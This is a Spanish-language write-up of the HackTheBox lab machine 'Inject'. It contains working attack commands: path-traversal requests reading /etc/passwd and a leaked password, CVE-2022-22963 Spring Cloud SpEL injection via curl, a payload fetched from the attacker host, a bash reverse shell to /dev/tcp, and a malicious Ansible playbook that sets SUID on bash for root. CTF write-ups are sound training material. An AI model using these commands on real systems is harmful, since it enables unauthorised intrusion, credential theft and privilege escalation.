---
layout      : post
title       : "Maquina Inject - htb writeup"
author      : Firtsmiracle
image       : assets/images/HTB/htb-writeup-Inject/inject.jpg
category    : [ hackthebox ]
tags        : [ Web Enumeation, Local File Inclusion, Information Leaked, Spring CLoud Explotation, Abusing Cron Job, Malicius Ansible Playbook]
---

El dia de hoy vamos a resolver `Inject` de `hackthebox` una maquina `linux` de dificultad facil, para explotar esta maquina vamos a aprovecharnos de una ruta de subida de archivos donde existe un `LFI` y a traves de este podrenmos obtener acceso a archivos con credenciales y información para la explotación de una versión de `spring framework` que nos otorgara `RCE` y finalmente para elevar nuestros privilegios abusaremos de una `cron job` para crearnos un archivo malicioso `ansible playbook`, manipulando los permisos de la `bash` y asi convertirnos en el usuario `root`. 
 
Maquina curiosa asi que vamos a darle!.

Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina:

```bash
❯ mkdir Inject
❯ ls

 Inject
```
Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:

```bash
❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
```

## ENUMERACION [#](#enumeracion) {#enumeracion}
 

Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando `ping`:

```bash
❯ ping -c 1 10.10.11.204
PING 10.10.11.204 (10.10.11.204) 56(84) bytes of data.
64 bytes from 10.10.11.204: icmp_seq=1 ttl=63 time=125 ms

--- 10.10.11.204 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 124.537/124.537/124.537/0.000 ms
```
Vemos que la maquina nos responde, con un ttl de `63` y por proximidad seria correspondiente a una maquina `linux`.

### ESCANEO DE PUERTOS

| Parámetro  |                    Descripción                          |
| -----------|:--------------------------------------------------------|                                           
|[-p-](#enumeracion)      | Escaneamos todos los 65535 puertos.                     |
|[--open](#enumeracion)     | Solo los puertos que estén abiertos.                    |
|[-v](#enumeracion)        | Permite ver en consola lo que va encontrando (verbose). |
|[-oG](#enumeracion)        | Guarda el output en un archivo con formato grepeable para que mediante una funcion de [S4vitar](https://s4vitar.github.io/) nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles |


Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre `openPorts`:

```java
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.204 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:09 GMT
Initiating SYN Stealth Scan at 18:09
Scanning 10.10.11.204 [65535 ports]
Discovered open port 8080/tcp on 10.10.11.204
Discovered open port 22/tcp on 10.10.11.204
Completed SYN Stealth Scan at 18:09, 15.98s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.13s latency).
Scanned at 2023-07-19 18:09:29 GMT for 16s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 16.10 seconds
           Raw packets sent: 78704 (3.463MB) | Rcvd: 78677 (3.147MB)
```

### ESCANEO DE VERSION Y SERVICIOS

```java
❯ nmap -sCV -p22,8080 10.10.11.204 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-19 18:10 GMT
Nmap scan report for 10.10.11.204
Host is up (0.15s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
```

Visulizamos información interesante de los puertos escaneados:

| Puerto | Servicio | Versión |
| ------ | -------- | --------|
| 22     | SSH     |  OpenSSH 8.2p1  |
| 8080   | HTTP     | nagios-nsca Nagios NSCA  |


## EXPLOTACION [#](#explotación) {#explotación}

Comenzamos usando `whatweb`, para determinar las tecnologias que esta usando el servicio web.

```bash
❯ whatweb http://10.10.11.204:8080
http://10.10.11.204:8080 [200 OK] Bootstrap, Content-Language[en-US], Country[RESERVED][ZZ], Frame, HTML5, IP[10.10.11.204], Title[Home], YouTube
```

La herramienta no nos reporta mucha información, asi que vamos a proceder a abrir el servicio con el navegador para visualizar el servicio.

![](/assets/images/HTB/htb-writeup-Inject/inj1.PNG)

Observamos que existe una sección de login y registro pero que esta actualmente en construcción.

![](/assets/images/HTB/htb-writeup-Inject/inj2.PNG)


En la pagina principal tambien podemos ver una sección de `upload`, la cual nos redirige a una ruta de subida de archivos.

![](/assets/images/HTB/htb-writeup-Inject/inj3.PNG)

Vamos a tratar de subir un archivo simple con extensión `txt` y vamos a interceptar la petición con `burpsuite` para realizar pruebas.

![](/assets/images/HTB/htb-writeup-Inject/inj4.PNG)

Interceptamos la petición y la mandamos al `Repeater`, y vemos como respuesta que solo podemos subir imagenes.

![](/assets/images/HTB/htb-writeup-Inject/inj5.PNG)


Si ahora alteramos la petición y cambiamos la extensión del archivo nos muestra un mensaje de subida correcta del archivo con su respectiva ruta.


![](/assets/images/HTB/htb-writeup-Inject/inj6.PNG)


Si ahora desde consola intentamos apuntar a la ruta, listando un directorio atras, obtenemos un `LFI`.

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=.."
java
resources
uploads
```

Ahora podemos listar los usuarios de el archivo `/etc/passwd`.

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd" | grep "sh$"
root:x:0:0:root:/root:/bin/bash
frank:x:1000:1000:frank:/home/frank:/bin/bash
phil:x:1001:1001::/home/phil:/bin/bash
```

Si ahora tratamos de listar el contenido del directorio de los usuarios, observamos un archivo `settings.xml` en el directorio del usuario `frank`. Vamos a exportar el contenido y dentro obtenemos unas credenciales del usuario `phill`.

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2"
settings.xml
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../../../../home/frank/.m2/settings.xml" -o settings.xml
```

```xml
❯ cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
```

Si tratamos de contectarnos por el servicio `ssh`, las credenciales no son correctas, y si ahora listamos dos directorios atras, encontramos otro archivo `pom.xml`.

```bash
❯ curl -s -X GET "http://10.10.11.204:8080/show_image?img=../../../"
.classpath
.DS_Store
.idea
.project
.settings
HELP.md
mvnw
mvnw.cmd
pom.xml
src
target
```

Si vemos el contenido vemos que esta relacionado a `spring framework`.

```xml
❯ cat pom.xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
	<modelVersion>4.0.0</modelVersion>
	<parent>
		<groupId>org.springframework.boot</groupId>
		<artifactId>spring-boot-starter-parent</artifactId>
		<version>2.6.5</version>
		<relativePath/> <!-- lookup parent from repository -->
```

> Spring Framework : Spring es un framework para el desarrollo de aplicaciones y contenedor de inversión de control, de código abierto para la plataforma Java.​ La primera versión fue escrita por Rod Johnson, quien lo lanzó junto a la publicación de su libro Expert One-on-One J2EE Design and Development. 


Si buscamos un poco encontramos un exploit que nos otorga `RCE`.

* [https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit](https://github.com/J0ey17/CVE-2022-22963_Reverse-Shell-Exploit)


Si abrimos el explit, observamos que este se aprovecha de una ruta `functionRouter` y envia un payload diseñado a traves de los headers donde ejecuta finalmente un comando.


![](/assets/images/HTB/htb-writeup-Inject/inj7.PNG)


Como no es tan complejo su explotación podemos hacerlo manualmente incoporando los parametros requeridos con el propio `curl`. Nos mandamos una traza a nuestra maquina host.


```bash
❯ curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("ping -c 1 10.10.16.2")' -d '.'
{"timestamp":"2023-07-19T18:56:07.739+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"
```

Y recibimos la petición.

```bash
❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:56:22.791783 IP 10.10.11.204 > 10.10.16.2: ICMP echo request, id 2, seq 1, length 64
18:56:22.791819 IP 10.10.16.2 > 10.10.11.204: ICMP echo reply, id 2, seq 1, length 64
```


Para ganar acceso vamos a crearnos un archivo en bash de nombre `index.html` que nos otorgue una reverse shell, el cual nos compartiremos y almancenaremos en la maquina victima para posteriormente ejecutarlo.


```bash
❯ cat index.html
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.2/443 0>&1
```


Realizamos la petición.

```bash
❯ curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("curl 10.10.16.2 -o /tmp/reverse")' -d '.'
{"timestamp":"2023-07-19T18:58:54.291+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}
```

Recibimos la petición en nuestro servicio.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.204 - - [19/Jul/2023 18:59:09] "GET / HTTP/1.1" 200 -
```

Ahora solo debemos ejecutarlo y ponermos en escucha con `ntcat`.


```bash
❯ curl -s -X POST "http://10.10.11.204:8080/functionRouter" -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse")' -d '.'
{"timestamp":"2023-07-19T19:05:11.598+00:00","status":500,"error":"Internal Server Error","message":"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String","path":"/functionRouter"}#                        
```

Obtenemos acceso como el usuario `frank`.

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.204.
Ncat: Connection from 10.10.11.204:60530.
bash: cannot set terminal process group (827): Inappropriate ioctl for device
bash: no job control in this shell
frank@inject:/$ whoami
whoami
frank
```

Como siempre hacemos el tratamiento para obtener una full `tty`.

```bash
frank@inject:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
frank@inject:/$ ^Z
zsh: suspended  ncat -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  ncat -nlvp 443
                                reset xterm
frank@inject:/$ export TERM=xterm
frank@inject:/$ export SHELL=bash
frank@inject:/$ stty rows 45 columns 184
```

Si ahora buscamos la flag y intentamos leerla vemos que no contamos con permisos.

```bash
frank@inject:/$ find / -name user.txt 2>/dev/null
/home/phil/user.txt
^C
frank@inject:/$ cat /home/phil/user.txt
cat: /home/phil/user.txt: Permission denied
```

Recordemos que antes obtuvimos unas credenciales del usuario `phil`, asi que vamos a tratar de usar esa contraseña y migrar al usuario `phil`.

```bash
frank@inject:/$ su phil
Password: 
phil@inject:/$ whoami
phil
```
Ahora podemos leer la primera flag `user.txt`

```bash
phil@inject:/$ cd /home/phil/
phil@inject:~$ cat user.txt 
7b309ae956b0821aef61ef39aa5d4f7e
```

## ELEVACION DE PRIVILEGIOS [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Ya que somos el usuario `phil`, listamos los grupos a los cuales pertenecemos y vemos uno correspondiente a `staff`. Seguidamente listamos los recuros a los que tenemos acceso.

```bash
phil@inject:~$ id
uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff)
phil@inject:~$ find / -group staff 2>/dev/null
/opt/automation/tasks
/root
/var/local
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/local/lib/python3.8/dist-packages/ansible_parallel.py
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/LICENSE
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/RECORD
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/entry_points.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/WHEEL
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/METADATA
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/top_level.txt
/usr/local/lib/python3.8/dist-packages/ansible_parallel-2021.1.22.dist-info/INSTALLER
/usr/local/lib/python3.8/dist-packages/__pycache__
/usr/local/lib/python3.8/dist-packages/__pycache__/ansible_parallel.cpython-38.pyc
/usr/local/share/fonts
/usr/local/share/fonts/.uuid
phil@inject:~$ /opt/automation/tasks
bash: /opt/automation/tasks: Is a directory
phil@inject:~$ ls -l /opt/automation/tasks
total 4
-rw-r--r-- 1 root root 150 Jul 19 20:02 playbook_1.yml
```

Observamos un `playbook.yml`, si investigamos un poco encotramos que esta relacionado a ansible.

> Un playbook de Ansible® es un plano técnico de las tareas de automatización, las cuales son acciones complejas de TI cuya ejecución se lleva a cabo con muy poca intervención humana o sin ella.

Vamos a crearnos un procmon, para listar los procesos que se estan ejecutando a intervalos regulares de tiempo.

```bash
phil@inject:/tmp$ cat procmon.sh
#!/bin/bash

old_process=$(ps -eo user, command)

while true; do
	new_process=$(ps -eo user, command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -vE "procmon|kworker|command"
	old_process=$new_process
done
```

Ejecutamos el script y obervamos que el usuario `root` esta ejecutando un borrado de todo lo que se encuentra en el directorio `tasks`.

```bash
phil@inject:/tmp$ ./procmon.sh 
< root     /usr/sbin/CRON -f
< root     /bin/sh -c sleep 10 && /usr/bin/rm -rf /opt/automation/tasks/* && /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/
< root     sleep 10
```

Lo que podemos hacer es crearnos un archivo similar a `playbook_1.yml` para insertar un comando y al ejecutar la tarea el usuario `root`, podemos tratar de cambiar los permisos de la `bash` otorgandole `suid` y asi poder convertirnos en el usuario `root`.

Para ello primero debemos crearnos un archivo `reverse.yml` malicioso que nos ejecute un comando, es simple pero puedes guiarte de la documentación para entenderlo mejor.

* [https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/command_module.html)



```bash
phil@inject:/opt/automation/tasks$ cat reverse.yml 
- hosts: localhost
  tasks:
  - name: suid to bash
    ansible.builtin.shell: chmod u+s /bin/bash
```

Ahora solo debemos esperar a que se ejecute la tarea y podemos ver que la `bash` ahora cuenta con el privilegio `suid`.

```bash
phil@inject:/opt/automation/tasks$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Lo que nos queda ahora es convertirnos en el usuario `root`, dirigirnos a su directorio personal y visualizar la segunda flag `root.txt`.

```bash
phil@inject:/opt/automation/tasks$ bash -p
bash-5.0# whoami
root
bash-5.0# cd /root
bash-5.0# cat root.txt 
26521e5fb779f8e62fa4d068175a3b5a
```
